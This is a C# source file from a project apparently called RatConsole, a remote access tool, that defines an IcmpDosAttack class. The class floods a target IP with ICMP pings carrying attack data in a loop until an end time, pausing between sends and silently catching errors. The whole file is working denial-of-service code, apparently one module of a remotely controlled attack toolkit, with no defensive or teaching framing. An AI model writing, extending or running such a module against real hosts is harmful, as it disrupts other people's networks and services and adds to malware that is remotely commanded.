using System;

namespace RatConsole.Domain.Services.DoS
{
	/// <summary>
	///		Clase para llevar a cabo un ataque DoS utilizando Icmp
	/// </summary>
	internal class IcmpDosAttack : AbstractDoSAttack
	{
		internal IcmpDosAttack(string ip, int port, TimeSpan delay, DateTime end) : base(ip, port, delay, end)
		{
		}

		/// <summary>
		///		Procesa el ataque
		/// </summary>
		internal override void Process()
		{
			while (!CheckEnd())
                try
                {
                    System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();

						// Envía el ping al objetivo
						ping.Send(Ip, 1000, GetAttackData(250)); //Send the ping to the target
						// Espera
						Wait();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine("DoS ICMP error: " + ex.Message);
                }
		}
	}
}
